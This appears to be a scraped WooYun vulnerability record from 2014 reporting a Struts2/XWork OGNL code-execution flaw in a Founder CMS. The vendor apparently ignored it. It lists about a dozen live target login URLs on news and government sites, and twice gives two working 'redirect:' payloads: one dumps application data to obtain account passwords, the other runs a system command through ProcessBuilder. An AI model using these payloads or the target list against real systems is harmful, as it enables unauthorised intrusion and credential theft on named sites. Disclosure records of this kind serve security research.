{"id": 42259, "wybug_id": "wooyun-2014-086298", "wybug_title": "方正某cms系统存在代码执行", "wybug_corp": "北京北大方正电子有限公司", "wybug_author": "xcfres54", "wybug_date": "2014-12-09 10:46", "wybug_open_date": "2015-03-09 10:46", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 读书少，不知道怎么写 详细说明：  http://www.tsrb.com.cn:7001/login.actionhttp://cms40.legaldaily.com.cn:7001/enpadmin/login.jsphttp://www.hnic.com.cn:7001/enpadmin/login.jsphttp://sys.zqsb.com.cn:7001/enpadmin/login.jsphttp://jjc.hbsjtt.gov.cn:81/enpadmin/login.jsphttp://210.72.21.12:8008/enpadmin/login.jspwww.china.com.cn http://jjc.hbsjtt.gov.cn:81/enpadmin/login.jsphttp://61.153.35.46:7001/enpadmin/login.jsp http://www.jhnews.com.cnhttp://210.192.127.111:8991/enpadmin/login.jsphttp://221.231.99.235:7001/enpadmin/login.jspycnews.cnst2代码执行 xwork版本较老poc:获取账号密码?redirect:${%23rep%3d%23context.get%28%27com.opensymphony.xwork.dispatcher.HttpServletResponse%27%29,%23rep.getWriter%28%29.println%28%23application%29,%23rep.getWriter%28%29.flush%28%29,%23rep.getWriter%28%29.close%28%29}执行命令?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}getshell还需要讲吗   漏洞证明：  http://www.tsrb.com.cn:7001/login.actionhttp://cms40.legaldaily.com.cn:7001/enpadmin/login.jsphttp://www.hnic.com.cn:7001/enpadmin/login.jsphttp://sys.zqsb.com.cn:7001/enpadmin/login.jsphttp://jjc.hbsjtt.gov.cn:81/enpadmin/login.jsphttp://210.72.21.12:8008/enpadmin/login.jspwww.china.com.cn http://jjc.hbsjtt.gov.cn:81/enpadmin/login.jsphttp://61.153.35.46:7001/enpadmin/login.jsp http://www.jhnews.com.cnhttp://210.192.127.111:8991/enpadmin/login.jsphttp://221.231.99.235:7001/enpadmin/login.jspycnews.cnst2代码执行 xwork版本较老poc:获取账号密码?redirect:${%23rep%3d%23context.get%28%27com.opensymphony.xwork.dispatcher.HttpServletResponse%27%29,%23rep.getWriter%28%29.println%28%23application%29,%23rep.getWriter%28%29.flush%28%29,%23rep.getWriter%28%29.close%28%29}执行命令?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}getshell还需要讲吗   修复方案：  禁止外部访问 另外搜索系统还有个注入 自己找   版权声明：转载请注明来源 xcfres54@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}